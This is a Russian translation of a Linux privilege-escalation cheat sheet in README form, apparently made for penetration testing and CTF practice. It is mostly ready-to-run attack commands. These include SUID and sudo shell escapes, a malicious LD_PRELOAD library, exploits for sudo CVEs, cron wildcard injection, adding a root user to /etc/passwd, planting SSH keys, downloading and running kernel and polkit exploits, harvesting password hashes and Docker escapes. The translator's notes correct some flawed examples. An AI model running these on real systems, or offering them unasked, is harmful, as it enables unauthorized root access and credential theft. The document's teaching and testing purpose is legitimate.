<a id="-linux-privilege-escalation---complete-cheatsheet"></a>
# 🐧 Повышение привилегий в Linux — полный справочник

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[← Русское оглавление](../../README.ru.md) · [Английский оригинал](../README.md)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗
  ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝
  ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝ 
  ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗ 
  ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗
  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Linux-PrivEsc-red?style=for-the-badge" alt="Linux PrivEsc">
  <img src="https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge" alt="Post Exploitation">
  <img src="https://img.shields.io/badge/Root-Access-blue?style=for-the-badge" alt="Root">
  <img src="https://img.shields.io/badge/CTF-Ready-green?style=for-the-badge" alt="CTF">
</p>

<p align="center">
  <b>🔓 Полное руководство по повышению привилегий в системах Linux</b>
</p>

---

<a id="-table-of-contents"></a>
## 📋 Содержание

- [Сбор сведений](#-enumeration)
- [SUID/SGID](#-suidsgid)
- [Отдельные привилегии (capabilities)](#-capabilities)
- [Эксплуатация sudo](#-sudo-exploitation)
- [Задания cron](#-cron-jobs)
- [Подмена команд через PATH](#-path-hijacking)
- [Преобразование прав root в NFS](#-nfs-root-squashing)
- [Эксплойты ядра](#-kernel-exploits)
- [Поиск паролей](#-password-mining)
- [Ключи SSH](#-ssh-keys)
- [Файлы, доступные для записи](#-writable-files)
- [Выход из Docker](#-docker-escape)
- [Краткий справочник](#-quick-reference)

---

<a id="-enumeration"></a>
## 🔍 Сбор сведений

<a id="system-information"></a>
### Сведения о системе

```bash
# Имя узла
hostname

# Операционная система и ядро
cat /etc/os-release
cat /etc/issue
uname -a
uname -r

# Архитектура
arch
uname -m

# Сведения о процессоре
cat /proc/cpuinfo
lscpu
```

<a id="user-information"></a>
### Сведения о пользователях

```bash
# Текущий пользователь
whoami
id

# Все пользователи
cat /etc/passwd
cat /etc/passwd | grep -v "nologin\|false"

# Группы пользователей
groups
cat /etc/group

# Пользователи с активными сеансами
w
who
users

# Последние входы в систему
last
lastlog

# Привилегии sudo
sudo -l
```

<a id="network-information"></a>
### Сетевые сведения

```bash
# IP-адреса
ip a
ifconfig

# Маршруты
ip route
route -n

# Открытые порты
netstat -tulpn
ss -tulpn

# Активные соединения
netstat -an
ss -an

# Кеш ARP
arp -a
ip neigh

# DNS
cat /etc/resolv.conf

# Локальные сопоставления имён узлов
cat /etc/hosts
```

<a id="process--services"></a>
### Процессы и службы

```bash
# Работающие процессы
ps aux
ps -ef
ps aux | grep root

# Службы
systemctl list-units --type=service
service --status-all

# Установленные пакеты
dpkg -l                    # Debian/Ubuntu
rpm -qa                    # RHEL/CentOS
```

<a id="scheduled-tasks"></a>
### Задачи по расписанию

```bash
# Таблицы заданий cron
crontab -l
ls -la /etc/cron*
cat /etc/crontab
cat /etc/cron.d/*

# Таймеры systemd
systemctl list-timers
```

---

<a id="-suidsgid"></a>
## 🔐 SUID/SGID

> **Уточнение к оригиналу.** По [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html), Linux игнорирует SUID/SGID у скриптов; nosuid и no_new_privs могут препятствовать изменению привилегий. Работа примеров зависит также от сборки программы и поведения оболочки. [Capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) — отдельные полномочия: CAP_NET_RAW само по себе не даёт права root. Исходные команды сохранены.


<a id="find-suid-binaries"></a>
### Поиск исполняемых файлов с SUID

```bash
# Найти файлы с SUID
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Найти файлы с SGID
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Найти файлы с любым из этих битов
find / -perm /6000 -type f 2>/dev/null
```

<a id="common-exploitable-suid-binaries"></a>
### Распространённые SUID-программы с возможностями эксплуатации

Способы эксплуатации приведены в [GTFOBins](https://gtfobins.github.io/).

<a id="bash"></a>
#### **bash**
```bash
# Если у bash установлен SUID
./bash -p
```

<a id="find"></a>
#### **find**
```bash
find . -exec /bin/sh -p \; -quit
```

<a id="vim"></a>
#### **vim**
```bash
vim -c ':!/bin/sh'
```

<a id="nmap-old-versions"></a>
#### **nmap** (старые версии)
```bash
nmap --interactive
!sh
```

<a id="python"></a>
#### **python**
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

<a id="perl"></a>
#### **perl**
```bash
perl -e 'exec "/bin/sh";'
```

<a id="lessmore"></a>
#### **less/more**
```bash
less /etc/passwd
!/bin/sh
```

<a id="cp"></a>
#### **cp**

> **Уточнение к примеру.** В [Bash](https://man7.org/linux/man-pages/man1/bash.1.html) одинарные кавычки сохраняют текст буквально: показанная подстановка $(openssl ...) внутри них не выполняется. Кроме того, резервная копия создаётся в /tmp/passwd.bak, а запись добавляется в /tmp/passwd. Это несогласованный пример оригинала; команды оставлены дословно.

```bash
# Скопировать /etc/passwd, добавить пользователя с UID root и скопировать обратно
LFILE=/etc/passwd
cp /etc/passwd /tmp/passwd.bak
echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd $LFILE
```

<a id="env"></a>
#### **env**
```bash
env /bin/sh -p
```

---

<a id="-capabilities"></a>
## ⚡ Отдельные привилегии (capabilities)

<a id="find-capabilities"></a>
### Поиск capabilities

```bash
# Получить capabilities файлов
getcap -r / 2>/dev/null

# Распространённые опасные capabilities
# CAP_SETUID — изменение UID
# CAP_NET_RAW — сырые сокеты
# CAP_DAC_READ_SEARCH — обход проверок чтения файлов и поиска в каталогах
```

<a id="exploit-capabilities"></a>
### Использование capabilities

<a id="python-cap_setuid"></a>
#### **Python (cap_setuid)**
```bash
# Если у python задано cap_setuid+ep
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

<a id="perl-cap_setuid"></a>
#### **Perl (cap_setuid)**
```bash
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
```

<a id="tar-cap_dac_read_search"></a>
#### **tar (cap_dac_read_search)**
```bash
# Прочитать файл с обходом обычных проверок доступа
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat etc/shadow
```

<a id="vim-cap_setuid"></a>
#### **vim (cap_setuid)**
```bash
vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

---

<a id="-sudo-exploitation"></a>
## 🔑 Эксплуатация sudo

<a id="check-sudo-permissions"></a>
### Проверка разрешений sudo

```bash
sudo -l
# Ищите записи NOPASSWD
# Ищите записи (ALL) или (root)
```

<a id="exploit-sudo"></a>
### Использование разрешённых команд sudo

<a id="sudo-all"></a>
#### **sudo ALL**
```bash
sudo /bin/bash
sudo su
```

<a id="ld_preload"></a>
#### **LD_PRELOAD**
```bash
# Если вывод sudo -l содержит env_keep+=LD_PRELOAD
# Создать вредоносную библиотеку

cat > /tmp/shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/any_allowed_program
```

<a id="sudo-vim"></a>
#### **sudo vim**
```bash
sudo vim -c ':!/bin/sh'
```

<a id="sudo-lessmore"></a>
#### **sudo less/more**
```bash
sudo less /etc/passwd
!/bin/sh
```

<a id="sudo-find"></a>
#### **sudo find**
```bash
sudo find /tmp -exec /bin/sh \;
```

<a id="sudo-nmap-interactive"></a>
#### **sudo nmap** (интерактивный режим)
```bash
sudo nmap --interactive
!sh
```

<a id="sudo-tar"></a>
#### **sudo tar**
```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

<a id="sudo-zip"></a>
#### **sudo zip**
```bash
sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"
```

<a id="sudo-env"></a>
#### **sudo env**
```bash
sudo env /bin/sh
```

<a id="sudo-awk"></a>
#### **sudo awk**
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

<a id="sudo-man"></a>
#### **sudo man**
```bash
sudo man man
!/bin/sh
```

<a id="sudo-apache2"></a>
#### **sudo apache2**
```bash
sudo apache2 -f /etc/shadow
# Раскрывает первую строку shadow
```

<a id="sudo-version-exploits"></a>
### Уязвимости отдельных версий sudo

```bash
# Проверить версию
sudo --version

# CVE-2019-14287 (sudo < 1.8.28)
sudo -u#-1 /bin/bash

# CVE-2021-3156 (Baron Samedit)
# sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```

---

<a id="-cron-jobs"></a>
## ⏰ Задания cron

<a id="find-cron-jobs"></a>
### Поиск заданий cron

```bash
# Системная таблица cron
cat /etc/crontab

# Каталоги cron
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# Таблицы cron пользователей
cat /var/spool/cron/crontabs/*

# Отслеживать задания cron
# Использовать pspy для наблюдения за процессами
```

<a id="exploit-cron-jobs"></a>
### Эксплуатация заданий cron

<a id="writable-cron-script"></a>
#### **Скрипт cron, доступный для записи**
```bash
# Если cron запускает скрипт, который вы можете изменять:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/script.sh

# Дождаться выполнения cron, затем:
/tmp/bash -p
```

<a id="wildcard-injection-tar"></a>
#### **Инъекция через подстановку имён файлов (tar)**
```bash
# Если cron запускает: tar czf /tmp/backup.tar.gz *

# Создать файлы для подстановки параметров
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh
touch "/path/--checkpoint=1"
touch "/path/--checkpoint-action=exec=sh shell.sh"
```

<a id="path-exploitation"></a>
#### **Использование PATH**
```bash
# Если cron использует относительный путь и вы управляете PATH
# В crontab указано: PATH=/home/user:/usr/local/bin:...
# Скрипт вызывает backup.sh без полного пути

# Создать подставной скрипт в доступном для записи каталоге PATH
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/backup.sh
chmod +x /home/user/backup.sh
```

---

<a id="-path-hijacking"></a>
## 🛤️ Подмена команд через PATH

<a id="find-vulnerable-scripts"></a>
### Поиск уязвимых скриптов

```bash
# Ищите скрипты, запускаемые root и использующие относительные пути
# Проверить скрипты с SUID (формулировка оригинала; см. уточнение)
# Проверить скрипты cron
# Проверить службы systemd
```

<a id="exploit-path"></a>
### Эксплуатация PATH

```bash
# Если скрипт root вызывает 'service' без полного пути
# и вы управляете PATH:

# Создать подставную команду 'service'
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH

# Запустить уязвимый скрипт
./vulnerable_script
```

---

<a id="-nfs-root-squashing"></a>
## 📁 Преобразование прав root в NFS (root squashing)

<a id="find-nfs-shares"></a>
### Поиск общих ресурсов NFS

```bash
# На машине атакующего
showmount -e target_ip

# Проверить экспортируемые ресурсы
cat /etc/exports
# Ищите no_root_squash
```

<a id="exploit-no_root_squash"></a>
### Использование no_root_squash

```bash
# На машине атакующего от имени root:
mkdir /tmp/nfs
mount -o rw target_ip:/share /tmp/nfs
cp /bin/bash /tmp/nfs/
chmod +s /tmp/nfs/bash

# На целевой системе:
/share/bash -p
```

---

<a id="-kernel-exploits"></a>
## 💣 Эксплойты ядра

<a id="check-kernel-version"></a>
### Проверка версии ядра

```bash
uname -r
uname -a
cat /proc/version
```

<a id="common-kernel-exploits"></a>
### Распространённые эксплойты ядра

> **Уточнение к таблице.** PwnKit — ошибка [pkexec в polkit](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt), а Baron Samedit — ошибка [sudo](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt), а не ядра. Диапазоны оригинала упрощены; версия сама по себе не учитывает исправления дистрибутива. [Dirty Pipe](https://dirtypipe.cm4all.com/) исправлен в 5.16.11, 5.15.25 и 5.10.102, поэтому верхняя граница строки не означает уязвимость исправленного выпуска. Показанный вызов sudoedit иллюстрирует ошибку и не является универсальным готовым повышением привилегий.


| CVE | Версия ядра | Название |
|-----|----------------|------|
| CVE-2016-5195 | 2.x - 4.8.3 | **Dirty COW** |
| CVE-2021-4034 | Все | **PwnKit** |
| CVE-2021-3156 | sudo < 1.9.5p2 | **Baron Samedit** |
| CVE-2022-0847 | 5.8 - 5.16.11 | **Dirty Pipe** |
| CVE-2022-2588 | 5.x | **DirtyCred** |

<a id="dirty-cow-cve-2016-5195"></a>
### Dirty COW (CVE-2016-5195)
```bash
# Загрузить и скомпилировать
wget https://www.exploit-db.com/download/40839
gcc -pthread 40839.c -o dirty -lcrypt
./dirty
```

<a id="pwnkit-cve-2021-4034"></a>
### PwnKit (CVE-2021-4034)
```bash
# Загрузить
git clone https://github.com/ly4k/PwnKit
cd PwnKit
chmod +x PwnKit
./PwnKit
```

<a id="dirty-pipe-cve-2022-0847"></a>
### Dirty Pipe (CVE-2022-0847)
```bash
# Сначала проверить версию ядра
uname -r

# Загрузить и скомпилировать
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
./exploit-1
```

---

<a id="-password-mining"></a>
## 🔑 Поиск паролей

<a id="search-for-passwords"></a>
### Поиск паролей в системе

```bash
# В файлах
grep -r "password" /home/ 2>/dev/null
grep -r "pass" /etc/ 2>/dev/null
grep -ri "password" /var/www/ 2>/dev/null

# Файлы конфигурации
cat /var/www/html/wp-config.php
cat /var/www/html/config.php
cat /etc/mysql/my.cnf

# Файлы истории команд
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.nano_history

# Переменные окружения
env
printenv
```

<a id="password-files"></a>
### Файлы паролей

```bash
# Файл shadow (обычно нужны права root или другой разрешённый доступ)
cat /etc/shadow

# Хеши паролей из shadow
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt
```

<a id="common-locations"></a>
### Типичные расположения

```bash
# Конфигурации веб-приложений
/var/www/html/wp-config.php
/var/www/html/config.php
/var/www/html/.htpasswd

# Конфигурации баз данных
/etc/mysql/my.cnf
/etc/postgresql/*/main/pg_hba.conf

# SSH
/home/*/.ssh/id_rsa
/root/.ssh/id_rsa

# Резервные копии
find / -name "*.bak" 2>/dev/null
find / -name "*.backup" 2>/dev/null
```

---

<a id="-ssh-keys"></a>
## 🔐 Ключи SSH

<a id="find-ssh-keys"></a>
### Поиск ключей SSH

```bash
# Закрытые ключи
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Разрешённые открытые ключи
cat /home/*/.ssh/authorized_keys
cat /root/.ssh/authorized_keys
```

<a id="exploit-ssh-keys"></a>
### Использование найденных ключей SSH

```bash
# Если найден доступный для чтения закрытый ключ:
chmod 600 id_rsa
ssh -i id_rsa user@localhost
ssh -i id_rsa root@localhost
```

<a id="add-your-ssh-key"></a>
### Добавление своего ключа SSH

```bash
# Создать ключ на машине атакующего
ssh-keygen -t rsa -b 4096

# Если можно изменять authorized_keys:
echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
echo "YOUR_PUBLIC_KEY" >> /home/user/.ssh/authorized_keys
```

---

<a id="-writable-files"></a>
## 📝 Файлы, доступные для записи

<a id="critical-writable-files"></a>
### Критические файлы, доступные для записи

```bash
# Проверить права на запись
ls -la /etc/passwd
ls -la /etc/shadow
ls -la /etc/sudoers
```

<a id="exploit-writable-etcpasswd"></a>
### Использование доступного для записи /etc/passwd

```bash
# Создать хеш пароля
openssl passwd -1 -salt hacker password
# Результат: $1$hacker$TzyKlv0/R/c28R.GAeLw.1

# Добавить пользователя с UID root
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0::/root:/bin/bash' >> /etc/passwd

# Войти в систему
su hacker
# Пароль: password
```

<a id="find-world-writable-files"></a>
### Поиск файлов с правом записи для всех

> **Уточнение.** В [GNU find](https://man7.org/linux/man-pages/man1/find.1.html) -writable проверяет доступ текущего пользователя; -perm -222 требует всех трёх битов записи. Эти проверки не тождественны проверке записи для остальных пользователей через -perm -o+w. Исходные варианты сохранены.


```bash
find / -writable -type f 2>/dev/null
find / -perm -222 -type f 2>/dev/null
find / -perm -o+w -type f 2>/dev/null

# Каталоги, доступные для записи всем пользователям
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
```

---

<a id="-docker-escape"></a>
## 🐳 Выход из контейнера Docker

<a id="check-if-in-docker"></a>
### Проверка нахождения в Docker

```bash
# Проверить наличие .dockerenv
ls -la /.dockerenv

# Проверить cgroups
cat /proc/1/cgroup | grep docker

# Проверить имя узла (случайная строка)
hostname
```

<a id="docker-socket-mount"></a>
### Подключённый сокет Docker

```bash
# Если подключён docker.sock
find / -name docker.sock 2>/dev/null
ls -la /var/run/docker.sock

# Выйти из контейнера через сокет Docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

<a id="privileged-container"></a>
### Привилегированный контейнер

```bash
# Если контейнер привилегированный
fdisk -l                    # Просмотреть диски хоста
mount /dev/sda1 /mnt
chroot /mnt
```

---

<a id="-quick-reference"></a>
## 📊 Краткий справочник

<a id="one-liner-enumeration"></a>
### Краткие команды сбора сведений

```bash
# Краткие сведения о системе
id; hostname; uname -a; cat /etc/issue

# Быстрый поиск SUID
find / -perm -4000 -type f 2>/dev/null

# Быстрая проверка capabilities
getcap -r / 2>/dev/null

# Быстрая проверка sudo
sudo -l

# Быстрая проверка cron
cat /etc/crontab; ls -la /etc/cron*

# Быстрый поиск паролей
grep -r "password" /home/ 2>/dev/null
```

<a id="automated-tools"></a>
### Инструменты автоматизации

| Инструмент | Описание |
|------|-------------|
| **LinPEAS** | Подробный сбор сведений |
| **LinEnum** | Сбор сведений о Linux |
| **linux-smart-enumeration** | LSE |
| **pspy** | Наблюдение за процессами |

<a id="quick-wins-checklist"></a>
### Список быстрых проверок

- [ ] `sudo -l` — проверить разрешения sudo
- [ ] SUID-программы — найти и проверить по GTFOBins
- [ ] Capabilities — `getcap -r / 2>/dev/null`
- [ ] Задания cron — есть ли скрипты, доступные для записи?
- [ ] Версия ядра — есть ли известные эксплойты?
- [ ] Доступный для чтения /etc/shadow
- [ ] Доступный для записи /etc/passwd
- [ ] Ключи SSH в /home/* или /root
- [ ] Подключённый сокет Docker
- [ ] NFS с no_root_squash

---

<a id="-resources"></a>
## 📚 Ресурсы

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

<a id="related-cheatsheets"></a>
### Связанные справочники
- [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- [Повышение привилегий в Windows](../../Windows-PrivEsc/translations/README.ru.md)

---

<p align="center">
  <b>🐧 Получите права root!</b><br>
  <i>Освойте повышение привилегий в Linux</i>
</p>
